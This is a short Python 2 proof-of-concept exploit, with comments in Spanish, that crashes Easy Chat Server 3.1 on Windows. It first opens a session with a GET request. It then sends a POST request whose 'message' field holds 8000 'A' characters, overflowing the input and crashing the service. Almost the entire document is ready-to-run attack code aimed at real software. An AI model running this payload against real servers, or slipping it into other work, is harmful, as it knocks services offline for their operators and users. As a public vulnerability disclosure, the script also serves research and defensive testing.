```
#!/usr/bin/python
#---------------------------------------------------------
# Title: Easy Chat Server Version 3.1 - (DOS)
# Date: 2019-05-07
# Author: Miguel Mendez Z
# Team: www.exploiting.cl
# Vendor: http://www.echatserver.com
# Software Link: http://www.echatserver.com/ecssetup.exe
# Platforms: Windows
# Version: 3.1
# Tested on: Windows Windows 7_x86/7_x64 [eng]
#---------------------------------------------------------
#
# 1- Primer socket con (GET) generamos una sesion valida para luego hacer el paso 2.
# 2- Segundo enviamos (POST) la data en la variable message para crashear la aplicacion.

import os, sys, socket
from time import sleep

ip = '127.0.0.1'
padding = 'A' * 8000

GET = (
"GET /chat.ghp?username=1&password=&room=1&sex=1 HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host: "+str(ip)+":80\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://"+str(ip)+"\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

try:
  print "\n [*] Ejecutando payload GET (Creando Sesion) - length " + str(len(GET))
  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s1.connect((ip, 80))
  s1.send(GET)
  s1.recv(1024)
  s1.close()
except:
  print "Sin conexion GET"

sleep(3)

POST = (
"POST /body2.ghp?username=1&password=&room=1 HTTP/1.1\r\n"
"Host: "+str(ip)+"\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: es-CL,en-US;q=0.5\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://"+str(ip)+"/chatsubmit.ghp?username=1&password=&room=1\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
"staticname=%3A000539&tnewname=&msayinfo=1&mnewname=&mtowho=All&mfilters=0&mfont=0&mfcolor=1&elist=&seltype=Theme&msg=&Submit=Send&sc=on&notifysound=on&message="+str(padding)+"&chat_flag="
)

try:
  print " [*] Ejecutando payload POST (Crashing) - length " + str(len(POST))
  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s2.connect((ip, 80))
  s2.send(POST)
  s2.recv(1024)
  s2.close()
except:
  print "Sin conexion POST"
            
```

